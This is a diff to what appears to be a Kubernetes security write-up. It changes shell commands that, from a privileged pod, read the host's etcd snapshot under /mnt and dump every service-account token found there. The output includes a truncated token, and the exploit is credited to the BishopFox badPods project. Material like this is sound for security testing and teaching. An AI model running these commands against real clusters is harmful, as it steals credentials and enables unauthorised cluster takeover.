@@ -58,7 +58,7 @@ k -n privileged-pods attach -it pod-privileged -c main
 artem  bin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
 
 
-$ [root@seck8s /]# strings /var/lib/etcd/member/snap/db
+$ [root@seck8s /]# strings /mnt/var/lib/etcd/member/snap/db
 </registry/configmaps/ingress-nginx/ingress-controller-leader
 	ConfigMap
 ingress-controller-leader
@@ -71,9 +71,9 @@ Update
 ...
 ```
 
-Print all etcd secrets:
+Print all etcd secrets (exploit taken from [here](https://github.com/BishopFox/badPods/blob/main/manifests/priv/README.md#mount-the-hosts-filesystem)):
 ```
-[root@seck8s /]# db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
+[root@seck8s /]# db=`strings /mnt/var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
 B/registry/secrets/kube-system/resourcequota-controller-token-7q9bd | eyJhbGciOiJSUzI1NiIsImtpZ...
 ...
 ```
